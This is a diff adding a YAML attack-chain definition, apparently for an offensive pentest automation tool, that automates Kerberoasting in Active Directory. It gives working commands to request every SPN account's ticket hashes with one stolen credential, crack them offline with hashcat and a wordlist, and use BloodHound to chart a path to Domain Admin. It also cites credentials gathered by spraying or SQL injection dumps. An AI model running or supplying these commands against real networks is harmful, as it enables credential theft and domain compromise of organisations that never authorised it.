@@ -1,0 +1,40 @@
+chain_id: kerberoast_standalone
+title: "AD — Kerberoast every SPN-bound account with one valid credential"
+severity: HIGH
+tags: [ad, kerberos, kerberoast, spn]
+
+trigger:
+  any_of:
+    - { kind: "valid-cred" }
+    - { kind: "valid-admin-cred" }
+    - { kind: "user:pass" }
+
+description: |
+  As soon as a single domain credential lands (any source — netexec,
+  hydra, SQLi dump, SMTP user enum + spray), request TGS tickets for
+  every SPN-registered account in the domain. Service accounts are
+  notoriously password-weak; the resulting hashes crack offline at
+  hashcat speed. This is one of the highest-yield AD attacks and costs
+  one credential.
+
+steps:
+  - id: 1
+    title: "Request all roastable tickets"
+    command: impacket-GetUserSPNs $DOMAIN/USUARIO:'PASSWORD' -dc-ip $DC -request -outputfile tgs.hash
+
+  - id: 2
+    title: "Crack offline (fires kerberos_kerberoast chain)"
+    command: hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "If you have a kerberos TGT cached (KRB5CCNAME) instead of a password"
+    command: impacket-GetUserSPNs $DOMAIN/USUARIO -k -no-pass -dc-ip $DC -request -outputfile tgs.hash
+
+  - id: 4
+    title: "BloodHound the resulting account once cracked"
+    command: |
+      bloodhound-python -d $DOMAIN -u USUARIO_CRACKED -p 'PASSWORD' -ns $DC -c All
+      # Then in BloodHound, mark as Owned, query 'Shortest path from Owned to DA'.
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
